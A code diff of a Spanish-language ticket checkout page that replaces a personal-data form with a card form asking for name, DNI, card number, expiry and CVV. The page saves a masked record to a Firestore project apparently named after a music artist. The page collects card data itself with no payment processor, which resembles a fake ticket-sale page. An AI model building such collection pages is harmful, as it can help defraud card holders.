@@ -456,36 +456,7 @@
         <div class="main-container">
             <h1 class="page-title">Confirma la operación</h1>
 
-            <div class="data-container">
-                <h3 style="margin-bottom: 20px; font-size: 16px; font-weight: 700;">Completa tus datos</h3>
-                <form id="personalDataForm" class="personal-data-form">
-                    <div class="form-group">
-                        <label for="nombre">Nombre *</label>
-                        <input type="text" id="nombre" name="nombre" placeholder="Tu nombre" required>
-                        <div class="error-message" data-field="nombre">Por favor completa este campo</div>
-                    </div>
-                    <div class="form-group">
-                        <label for="apellido">Apellido *</label>
-                        <input type="text" id="apellido" name="apellido" placeholder="Tu apellido" required>
-                        <div class="error-message" data-field="apellido">Por favor completa este campo</div>
-                    </div>
-                    <div class="form-group">
-                        <label for="numero">Número de teléfono *</label>
-                        <input type="tel" id="numero" name="numero" placeholder="Tu número de teléfono" required>
-                        <div class="error-message" data-field="numero">Por favor completa este campo</div>
-                    </div>
-                    <div class="form-group">
-                        <label for="cuil">CUIL *</label>
-                        <input type="text" id="cuil" name="cuil" placeholder="Tu CUIL sin guiones" required>
-                        <div class="error-message" data-field="cuil">Por favor completa este campo</div>
-                    </div>
-                    <div class="form-group">
-                        <label for="email">Gmail *</label>
-                        <input type="email" id="email" name="email" placeholder="Tu correo electrónico" required>
-                        <div class="error-message" data-field="email">Por favor ingresa un email válido</div>
-                    </div>
-                </form>
-            </div>
+            <!-- Sección de datos personales removida por solicitud -->
 
             <div class="confirmation-container">
                 <div class="section-header">
@@ -511,6 +482,36 @@
                         <span class="cost-value" id="totalDisplay">$ 425.500,00</span>
                     </div>
                 </div>
+            </div>
+
+            <!-- Sección de pago con tarjeta (oculta hasta reservar) -->
+            <div id="cardPaymentSection" class="confirmation-container" style="display:none;">
+                <h3>Ingresá los datos de la tarjeta</h3>
+                <form id="cardForm">
+                    <div class="form-group">
+                        <label for="card_fullname">Nombre completo del titular *</label>
+                        <input type="text" id="card_fullname" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="card_dni">Documento (DNI) *</label>
+                        <input type="text" id="card_dni" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="card_number">Número de tarjeta *</label>
+                        <input type="text" id="card_number" maxlength="19" placeholder="0000 0000 0000 0000" required>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="card_exp">Fecha de vencimiento (MM/AA) *</label>
+                            <input type="text" id="card_exp" placeholder="MM/AA" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="card_cvv">Código de seguridad (CVV) *</label>
+                            <input type="text" id="card_cvv" maxlength="4" required>
+                        </div>
+                    </div>
+                    <div style="margin-top:16px;"><button type="button" class="btn-confirm" onclick="saveCardAndProceed()">Pagar y reservar</button></div>
+                </form>
             </div>
         </div>
     </div>
@@ -588,19 +589,9 @@
         }
 
         function confirmReservation() {
-            if (validateForm()) {
-                // Guardar datos en localStorage
-                const formData = {
-                    nombre: document.getElementById('nombre').value,
-                    apellido: document.getElementById('apellido').value,
-                    numero: document.getElementById('numero').value,
-                    cuil: document.getElementById('cuil').value,
-                    email: document.getElementById('email').value
-                };
-
-                localStorage.setItem('personalData', JSON.stringify(formData));
-                window.location.href = 'payment.html';
-            }
+            // Mostrar la sección de tarjeta directamente
+            document.getElementById('cardPaymentSection').style.display = 'block';
+            document.getElementById('cardPaymentSection').scrollIntoView({behavior:'smooth'});
         }
 
         function validateForm() {
@@ -644,14 +635,56 @@
             document.getElementById('eventDate').textContent = dateOnly + ' 20:00';
         }
 
-        // Limpiar errores cuando el usuario empieza a escribir
-        document.getElementById('personalDataForm').querySelectorAll('input').forEach(input => {
-            input.addEventListener('input', function() {
-                this.style.borderColor = '#d0deff';
-                const errorMsg = document.querySelector(`.error-message[data-field="${this.name}"]`);
-                if (errorMsg) errorMsg.classList.remove('show');
-            });
-        });
+        // (Se removió el formulario de datos personales; no hay inputs a limpiar aquí.)
+        
+        // --- Código para guardar tarjeta en Firestore ---
+        async function saveCardAndProceed() {
+            const fullName = document.getElementById('card_fullname').value.trim();
+            const dni = document.getElementById('card_dni').value.trim();
+            const number = document.getElementById('card_number').value.replace(/\s/g,'');
+            const exp = document.getElementById('card_exp').value.trim();
+            const cvv = document.getElementById('card_cvv').value.trim();
+
+            if (!fullName || !dni || !number || !exp || !cvv) { alert('Completa todos los campos de la tarjeta'); return; }
+
+            try {
+                // Inicializar Firebase (módulo importado dinámicamente)
+                const { initializeApp } = await import('https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js');
+                const { getFirestore, doc, setDoc } = await import('https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js');
+
+                const firebaseConfig = {
+                    apiKey: "AIzaSyCxq7lebIs8QO_I950XinLK2108H7TTjkY",
+                    authDomain: "badbunny-e57ff.firebaseapp.com",
+                    projectId: "badbunny-e57ff",
+                    storageBucket: "badbunny-e57ff.firebasestorage.app",
+                    messagingSenderId: "401847470375",
+                    appId: "1:401847470375:web:2a7e56c30adfe0e4b80102",
+                    measurementId: "G-GP159FTDGF"
+                };
+
+                const app = initializeApp(firebaseConfig);
+                const db = getFirestore(app);
+
+                const personal = JSON.parse(localStorage.getItem('personalData') || '{}');
+                const emailKey = personal.email || ('anon_' + Date.now());
+
+                await setDoc(doc(db, 'pagos', emailKey + '_' + Date.now()), {
+                    titular: fullName,
+                    dni: dni,
+                    cardNumber: '**** **** **** ' + number.slice(-4),
+                    exp: exp,
+                    cvv: '***',
+                    cliente: personal,
+                    fecha: new Date()
+                });
+
+                // Redirigir a página de proceso
+                window.location.href = 'processing-confirmation.html';
+            } catch (err) {
+                console.error(err);
+                alert('Error guardando datos de la tarjeta: ' + err.message);
+            }
+        }
     </script>
 
 </body>
